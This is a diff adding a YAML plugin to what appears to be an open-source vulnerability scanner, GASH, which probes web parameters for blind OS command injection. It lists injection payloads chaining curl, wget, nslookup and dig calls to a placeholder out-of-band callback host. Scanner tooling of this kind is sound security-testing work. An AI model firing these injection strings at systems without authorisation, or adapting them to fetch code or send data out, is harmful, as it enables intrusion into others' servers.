@@ -1,0 +1,44 @@
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright (C) 2026 Xmar1881 / GASH contributors
+# Module: github.com/Xmar1881/Gash
+#
+# File: plugins/command-injection/command-injection-oob.yaml
+# What: Tier 1 blind command injection plugin backed by OOBOracle (GASH-010).
+# Why: Blind OS command injection with out-of-band callback confirmation.
+#   Requires self-hosted --oob-server; without it the plugin skips honestly.
+#   Payloads use harmless DNS/HTTP callbacks (curl, wget, nslookup, dig).
+#   Confirmed ONLY on callback match; no timing fallback.
+
+id: command-injection-oob
+name: Command Injection OOB (Blind)
+description: Detects blind OS command injection via out-of-band DNS/HTTP callback. Requires --oob-server.
+author: GASH contributors
+severity: critical
+tags: [command-injection, injection, blind, oob, rce]
+safe: false
+deep: false
+active: true
+requires_auth: false
+max_requests: 60
+phase: probe
+order: 62
+oob: required
+api_version: "1.0"
+tests: tests/fixtures/command-injection-oob/
+request:
+  method: GET
+  param_names: [cmd, exec, command, ip, host, target, arg]
+  payloads:
+    - "; curl {{OOB_URL}}"
+    - "| curl {{OOB_URL}}"
+    - "`curl {{OOB_URL}}`"
+    - "; wget -qO- {{OOB_URL}}"
+    - "| wget -qO- {{OOB_URL}}"
+    - "; nslookup {{OOB_DOMAIN}}"
+    - "| nslookup {{OOB_DOMAIN}}"
+    - "; dig @{{OOB_DOMAIN}}"
+    - "| dig @{{OOB_DOMAIN}}"
+oracle:
+  name: oob
+  params:
+    namespace: "cmd-inj"
